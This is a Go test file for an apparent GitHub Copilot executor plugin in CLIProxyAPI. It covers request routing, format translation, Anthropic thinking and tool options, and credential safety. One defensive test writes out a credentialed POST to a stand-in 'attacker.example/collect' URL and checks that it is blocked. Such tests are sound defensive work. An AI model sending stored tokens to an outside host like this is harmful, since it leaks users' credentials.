package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/router-for-me/CLIProxyAPI/v7/sdk/pluginabi"
	"github.com/router-for-me/CLIProxyAPI/v7/sdk/pluginapi"
)

func TestExecuteUsesHostBridgeAndCopilotHeaders(t *testing.T) {
	service := newPluginService(nil)
	service.now = func() time.Time { return time.Unix(50_000, 0).UTC() }
	storage := executorStorage(service.now(), storedModel{ID: "gpt-4.1", Format: formatOpenAI})
	bridge := &fakeBridge{}
	bridge.handler = func(method string, payload any) (any, error) {
		if method != pluginabi.MethodHostHTTPDo {
			t.Fatalf("method = %s", method)
		}
		req := payload.(rpcHostHTTPRequest)
		if req.HostCallbackID != "callback-execute" || req.URL != "https://api.individual.githubcopilot.com/chat/completions" {
			t.Fatalf("upstream request = %#v", req)
		}
		if got := http.Header(req.Headers).Get("Authorization"); got != "Bearer tid=session;proxy-ep=proxy.individual.githubcopilot.com" {
			t.Fatalf("Authorization = %q", got)
		}
		if got := http.Header(req.Headers).Get("X-Initiator"); got != "user" {
			t.Fatalf("X-Initiator = %q", got)
		}
		var body map[string]any
		if json.Unmarshal(req.Body, &body) != nil || body["model"] != "gpt-4.1" || body["stream"] != false {
			t.Fatalf("upstream body = %s", req.Body)
		}
		return pluginapi.HTTPResponse{
			StatusCode: 200,
			Headers:    http.Header{"Content-Type": []string{"application/json"}, "X-GitHub-Request-Id": []string{"request-1"}},
			Body:       []byte(`{"id":"chatcmpl-1","object":"chat.completion","created":1,"model":"gpt-4.1","choices":[{"index":0,"message":{"role":"assistant","content":"hello"},"finish_reason":"stop"}]}`),
		}, nil
	}
	service.bridge = bridge
	payload := []byte(`{"model":"github-copilot/gpt-4.1","messages":[{"role":"user","content":"hello"}]}`)
	raw, errExecute := service.execute(mustJSON(t, rpcExecutorRequest{
		ExecutorRequest: pluginapi.ExecutorRequest{
			AuthID:          "auth-1",
			Model:           "github-copilot/gpt-4.1",
			Format:          formatOpenAI,
			SourceFormat:    formatOpenAI,
			OriginalRequest: payload,
			Payload:         payload,
			StorageJSON:     mustJSON(t, storage),
			Headers:         http.Header{"Authorization": []string{"Bearer frontend-secret"}},
		},
		HostCallbackID: "callback-execute",
	}))
	if errExecute != nil {
		t.Fatal(errExecute)
	}
	result := decodePluginResult[pluginapi.ExecutorResponse](t, raw)
	if !strings.Contains(string(result.Payload), `"content":"hello"`) || result.Headers.Get("X-GitHub-Request-Id") != "request-1" {
		t.Fatalf("executor result = %#v", result)
	}
}

func TestExecuteTranslatesChatCompletionsToResponsesAndBack(t *testing.T) {
	service := newPluginService(nil)
	service.now = func() time.Time { return time.Unix(60_000, 0).UTC() }
	storage := executorStorage(service.now(), storedModel{ID: "gpt-5.4", Format: formatOpenAIResponse})
	bridge := &fakeBridge{}
	bridge.handler = func(method string, payload any) (any, error) {
		if method != pluginabi.MethodHostHTTPDo {
			t.Fatalf("method = %s", method)
		}
		req := payload.(rpcHostHTTPRequest)
		if !strings.HasSuffix(req.URL, "/responses") {
			t.Fatalf("URL = %s", req.URL)
		}
		var body map[string]any
		if errDecode := json.Unmarshal(req.Body, &body); errDecode != nil {
			t.Fatalf("decode translated body: %v", errDecode)
		}
		if _, ok := body["input"]; !ok || body["model"] != "gpt-5.4" {
			t.Fatalf("translated Responses body = %s", req.Body)
		}
		return pluginapi.HTTPResponse{StatusCode: 200, Body: []byte(`{
			"id":"resp_1",
			"object":"response",
			"created_at":1,
			"status":"completed",
			"model":"gpt-5.4",
			"output":[{"id":"msg_1","type":"message","status":"completed","role":"assistant","content":[{"type":"output_text","text":"translated hello","annotations":[]}]}],
			"usage":{"input_tokens":3,"output_tokens":2,"total_tokens":5}
		}`)}, nil
	}
	service.bridge = bridge
	payload := []byte(`{"model":"gpt-5.4","messages":[{"role":"user","content":"hello"}]}`)
	raw, errExecute := service.execute(mustJSON(t, rpcExecutorRequest{
		ExecutorRequest: pluginapi.ExecutorRequest{
			AuthID: "auth-1", Model: "gpt-5.4", Format: formatOpenAI, SourceFormat: formatOpenAI,
			OriginalRequest: payload, Payload: payload, StorageJSON: mustJSON(t, storage),
		},
		HostCallbackID: "callback-responses",
	}))
	if errExecute != nil {
		t.Fatal(errExecute)
	}
	result := decodePluginResult[pluginapi.ExecutorResponse](t, raw)
	var completion map[string]any
	if errDecode := json.Unmarshal(result.Payload, &completion); errDecode != nil {
		t.Fatalf("decode translated completion: %v; payload=%s", errDecode, result.Payload)
	}
	if !strings.Contains(string(result.Payload), "translated hello") || completion["object"] != "chat.completion" {
		t.Fatalf("translated completion = %s", result.Payload)
	}
}

func TestPrepareInferenceSelectsAllProtocolEndpoints(t *testing.T) {
	service := newPluginService(nil)
	now := time.Unix(70_000, 0).UTC()
	service.now = func() time.Time { return now }
	for _, test := range []struct {
		model  string
		format string
		path   string
		body   string
	}{
		{model: "gpt-4.1", format: formatOpenAI, path: "/chat/completions", body: `{"model":"gpt-4.1","messages":[{"role":"user","content":"hi"}]}`},
		{model: "gpt-5.4", format: formatOpenAIResponse, path: "/responses", body: `{"model":"gpt-5.4","input":[{"role":"user","content":"hi"}]}`},
		{model: "claude-sonnet-4.6", format: formatClaude, path: "/v1/messages", body: `{"model":"claude-sonnet-4.6","max_tokens":100,"messages":[{"role":"user","content":"hi"}]}`},
	} {
		t.Run(test.model, func(t *testing.T) {
			storage := executorStorage(now, storedModel{ID: test.model, Format: test.format})
			prepared, failure := service.prepareInference(pluginapi.ExecutorRequest{
				AuthID: "auth", Model: test.model, Format: test.format, SourceFormat: test.format,
				Payload: []byte(test.body), StorageJSON: mustJSON(t, storage),
			}, false)
			if failure != nil {
				t.Fatal(failure)
			}
			if !strings.HasSuffix(prepared.upstreamURL, test.path) || prepared.upstreamFormat != test.format {
				t.Fatalf("prepared = %#v", prepared)
			}
		})
	}
}

func TestAnthropicEagerToolInputStreamingCompatibility(t *testing.T) {
	service := newPluginService(nil)
	now := time.Unix(75_000, 0).UTC()
	service.now = func() time.Time { return now }

	prepare := func(t *testing.T, model, payload string) preparedInference {
		t.Helper()
		prepared, failure := service.prepareInference(pluginapi.ExecutorRequest{
			AuthID: "auth", Model: model, Format: formatClaude, SourceFormat: formatClaude,
			Payload: []byte(payload), StorageJSON: mustJSON(t, executorStorage(now, storedModel{ID: model, Format: formatClaude})),
		}, true)
		if failure != nil {
			t.Fatal(failure)
		}
		return prepared
	}
	decode := func(t *testing.T, prepared preparedInference) map[string]any {
		t.Helper()
		var payload map[string]any
		if errDecode := json.Unmarshal(prepared.upstreamPayload, &payload); errDecode != nil {
			t.Fatalf("decode upstream payload: %v", errDecode)
		}
		return payload
	}

	t.Run("sends per-tool eager_input_streaming by default", func(t *testing.T) {
		prepared := prepare(t, "claude-opus-4.8", `{
			"model":"claude-opus-4.8",
			"messages":[{"role":"user","content":"Use the tool"}],
			"tools":[{"name":"lookup","description":"Look up a value","input_schema":{"type":"object"}}]
		}`)
		payload := decode(t, prepared)
		tools, ok := payload["tools"].([]any)
		if !ok || len(tools) != 1 {
			t.Fatalf("tools = %#v", payload["tools"])
		}
		tool, ok := tools[0].(map[string]any)
		if !ok || tool["eager_input_streaming"] != true {
			t.Fatalf("first tool = %#v", tools[0])
		}
		if beta := prepared.headers.Get("Anthropic-Beta"); beta != "" {
			t.Fatalf("Anthropic-Beta = %q", beta)
		}
	})

	t.Run("uses the legacy fine-grained beta when eager input streaming is disabled", func(t *testing.T) {
		for _, model := range []string{"claude-haiku-4.5", "claude-sonnet-4", "claude-sonnet-4.5"} {
			t.Run(model, func(t *testing.T) {
				prepared := prepare(t, model, `{
					"model":"`+model+`",
					"messages":[{"role":"user","content":"Use the tool"}],
					"tools":[{"name":"lookup","eager_input_streaming":true,"input_schema":{"type":"object"}}]
				}`)
				payload := decode(t, prepared)
				tools, ok := payload["tools"].([]any)
				if !ok || len(tools) != 1 {
					t.Fatalf("tools = %#v", payload["tools"])
				}
				tool, ok := tools[0].(map[string]any)
				if !ok {
					t.Fatalf("first tool = %#v", tools[0])
				}
				if _, exists := tool["eager_input_streaming"]; exists {
					t.Fatalf("eager_input_streaming reached %s: %#v", model, tool)
				}
				if beta := prepared.headers.Get("Anthropic-Beta"); beta != fineGrainedToolBeta {
					t.Fatalf("Anthropic-Beta = %q", beta)
				}
			})
		}
	})

	t.Run("omits tools and legacy beta when there are no tools", func(t *testing.T) {
		prepared := prepare(t, "claude-haiku-4.5", `{
			"model":"claude-haiku-4.5",
			"messages":[{"role":"user","content":"Hello"}],
			"tools":[]
		}`)
		payload := decode(t, prepared)
		if _, exists := payload["tools"]; exists {
			t.Fatalf("empty tools were retained: %#v", payload["tools"])
		}
		if beta := prepared.headers.Get("Anthropic-Beta"); beta != "" {
			t.Fatalf("Anthropic-Beta = %q", beta)
		}
	})
}

func TestHaikuNormalizesClaudeCodeRequestLikePi(t *testing.T) {
	service := newPluginService(nil)
	now := time.Unix(77_000, 0).UTC()
	service.now = func() time.Time { return now }
	const model = "claude-haiku-4.5"
	payload := []byte(`{
		"model":"claude-haiku-4.5",
		"max_tokens":32000,
		"system":[{"type":"text","text":"top-level system"}],
		"messages":[
			{"role":"user","content":"Hello"},
			{"role":"system","content":[{"type":"text","text":"mid-system","cache_control":{"type":"ephemeral"}}]}
		],
		"tools":[],
		"thinking":{"type":"adaptive","display":"omitted"},
		"output_config":{"effort":"high"},
		"context_management":{"edits":[]}
	}`)
	prepared, failure := service.prepareInference(pluginapi.ExecutorRequest{
		AuthID: "auth", Model: model, Format: formatClaude, SourceFormat: formatClaude,
		Payload: payload, StorageJSON: mustJSON(t, executorStorage(now, storedModel{ID: model, Format: formatClaude})),
		Headers: http.Header{"Anthropic-Beta": []string{
			"interleaved-thinking-2025-05-14,thinking-token-count-2026-05-13,context-management-2025-06-27,prompt-caching-scope-2026-01-05,mid-conversation-system-2026-04-07,claude-code-20250219,effort-2025-11-24",
		}},
	}, true)
	if failure != nil {
		t.Fatal(failure)
	}
	var body map[string]any
	if errDecode := json.Unmarshal(prepared.upstreamPayload, &body); errDecode != nil {
		t.Fatalf("decode upstream payload: %v", errDecode)
	}
	if _, exists := body["tools"]; exists {
		t.Fatalf("empty tools were retained: %#v", body["tools"])
	}
	if _, exists := body["output_config"]; exists {
		t.Fatalf("adaptive output_config was retained: %#v", body["output_config"])
	}
	if _, exists := body["context_management"]; exists {
		t.Fatalf("context_management was retained: %#v", body["context_management"])
	}
	thinking, ok := body["thinking"].(map[string]any)
	if !ok || thinking["type"] != "enabled" || thinking["budget_tokens"] != float64(16384) || thinking["display"] != "summarized" {
		t.Fatalf("thinking = %#v", body["thinking"])
	}
	messages, ok := body["messages"].([]any)
	if !ok || len(messages) != 1 || messages[0].(map[string]any)["role"] != "user" {
		t.Fatalf("messages = %#v", body["messages"])
	}
	system, ok := body["system"].([]any)
	if !ok || len(system) != 2 {
		t.Fatalf("system = %#v", body["system"])
	}
	moved := system[1].(map[string]any)
	if moved["text"] != "mid-system" || moved["cache_control"] == nil {
		t.Fatalf("moved system block = %#v", moved)
	}
	if beta := prepared.headers.Get("Anthropic-Beta"); beta != interleavedThinkingBeta {
		t.Fatalf("Anthropic-Beta = %q", beta)
	}
}

func TestAnthropicBudgetThinkingLeavesOutputRoom(t *testing.T) {
	for _, test := range []struct {
		effort    string
		maxTokens int
		want      int
	}{
		{effort: "minimal", maxTokens: 32000, want: 1024},
		{effort: "low", maxTokens: 32000, want: 2048},
		{effort: "medium", maxTokens: 32000, want: 8192},
		{effort: "high", maxTokens: 32000, want: 16384},
		{effort: "xhigh", maxTokens: 32000, want: 16384},
		{effort: "high", maxTokens: 4096, want: 3072},
	} {
		t.Run(fmt.Sprintf("%s-%d", test.effort, test.maxTokens), func(t *testing.T) {
			payload := map[string]any{
				"max_tokens":    test.maxTokens,
				"thinking":      map[string]any{"type": "adaptive"},
				"output_config": map[string]any{"effort": test.effort},
			}
			if !normalizeAnthropicPayload(payload, "claude-haiku-4.5") {
				t.Fatal("payload was not normalized")
			}
			thinking := payload["thinking"].(map[string]any)
			if thinking["budget_tokens"] != test.want {
				t.Fatalf("thinking = %#v", thinking)
			}
		})
	}
}

func TestExecuteUpstreamErrorDoesNotExposeBodyOrToken(t *testing.T) {
	const sentinel = "SENTINEL_PRIVATE_UPSTREAM_BODY"
	service := newPluginService(nil)
	now := time.Unix(80_000, 0).UTC()
	service.now = func() time.Time { return now }
	storage := executorStorage(now, storedModel{ID: "gpt-4.1", Format: formatOpenAI})
	bridge := &fakeBridge{handler: func(_ string, _ any) (any, error) {
		return pluginapi.HTTPResponse{StatusCode: http.StatusForbidden, Body: []byte(sentinel)}, nil
	}}
	service.bridge = bridge
	payload := []byte(`{"model":"gpt-4.1","messages":[{"role":"user","content":"hi"}]}`)
	_, failure := service.execute(mustJSON(t, rpcExecutorRequest{ExecutorRequest: pluginapi.ExecutorRequest{
		AuthID: "auth", Model: "gpt-4.1", Format: formatOpenAI, SourceFormat: formatOpenAI,
		Payload: payload, StorageJSON: mustJSON(t, storage),
	}}))
	if failure == nil || strings.Contains(failure.Error(), sentinel) || strings.Contains(failure.Error(), storage.CopilotSessionToken) {
		t.Fatalf("failure = %v", failure)
	}
	pluginErr := failure.(*pluginFailure)
	if pluginErr.httpStatus != http.StatusForbidden {
		t.Fatalf("HTTP status = %d", pluginErr.httpStatus)
	}
	assertLogsExclude(t, bridge.snapshotLogs(), sentinel, storage.CopilotSessionToken)
}

func TestExecuteHTTPRequestEnforcesCredentialOrigin(t *testing.T) {
	service := newPluginService(nil)
	now := time.Unix(90_000, 0).UTC()
	service.now = func() time.Time { return now }
	storage := executorStorage(now, storedModel{ID: "gpt-4.1", Format: formatOpenAI})
	bridge := &fakeBridge{handler: func(method string, _ any) (any, error) {
		t.Fatalf("unexpected host call %s", method)
		return nil, nil
	}}
	service.bridge = bridge
	_, failure := service.executeHTTPRequest(mustJSON(t, rpcExecutorHTTPRequest{ExecutorHTTPRequest: pluginapi.ExecutorHTTPRequest{
		URL: "https://attacker.example/collect", Method: http.MethodPost, Body: []byte(`{"model":"gpt-4.1"}`), StorageJSON: mustJSON(t, storage),
	}}))
	if failure == nil || failure.(*pluginFailure).httpStatus != http.StatusBadRequest {
		t.Fatalf("failure = %#v", failure)
	}
	if len(bridge.snapshot()) != 0 {
		t.Fatal("blocked cross-origin request reached host bridge")
	}
}

func TestExecuteHTTPRequestAppliesAnthropicEagerToolCompatibility(t *testing.T) {
	service := newPluginService(nil)
	now := time.Unix(95_000, 0).UTC()
	service.now = func() time.Time { return now }
	storage := executorStorage(now, storedModel{ID: "claude-haiku-4.5", Format: formatClaude})
	bridge := &fakeBridge{handler: func(method string, payload any) (any, error) {
		if method != pluginabi.MethodHostHTTPDo {
			t.Fatalf("method = %s", method)
		}
		req := payload.(rpcHostHTTPRequest)
		var body map[string]any
		if errDecode := json.Unmarshal(req.Body, &body); errDecode != nil {
			t.Fatalf("decode upstream body: %v", errDecode)
		}
		tools, ok := body["tools"].([]any)
		if !ok || len(tools) != 1 {
			t.Fatalf("tools = %#v", body["tools"])
		}
		tool := tools[0].(map[string]any)
		if _, exists := tool["eager_input_streaming"]; exists {
			t.Fatalf("eager_input_streaming reached HTTP bridge: %#v", tool)
		}
		if beta := http.Header(req.Headers).Get("Anthropic-Beta"); beta != fineGrainedToolBeta {
			t.Fatalf("Anthropic-Beta = %q", beta)
		}
		return pluginapi.HTTPResponse{StatusCode: http.StatusOK, Body: []byte(`{"ok":true}`)}, nil
	}}
	service.bridge = bridge
	body := []byte(`{
		"model":"claude-haiku-4.5",
		"messages":[{"role":"user","content":"Use the tool"}],
		"tools":[{"name":"lookup","eager_input_streaming":true,"input_schema":{"type":"object"}}]
	}`)
	_, failure := service.executeHTTPRequest(mustJSON(t, rpcExecutorHTTPRequest{ExecutorHTTPRequest: pluginapi.ExecutorHTTPRequest{
		URL:         "https://api.individual.githubcopilot.com/v1/messages",
		Method:      http.MethodPost,
		Body:        body,
		StorageJSON: mustJSON(t, storage),
	}}))
	if failure != nil {
		t.Fatal(failure)
	}
}

func executorStorage(now time.Time, models ...storedModel) copilotStorage {
	return copilotStorage{
		Type:                pluginIdentifier,
		GitHubAccessToken:   "ghu-long-term",
		CopilotSessionToken: "tid=session;proxy-ep=proxy.individual.githubcopilot.com",
		RefreshAfter:        now.Add(time.Hour).UnixMilli(),
		ExpiresAt:           now.Add(2 * time.Hour).UnixMilli(),
		GitHubHost:          "github.com",
		Models:              models,
	}
}
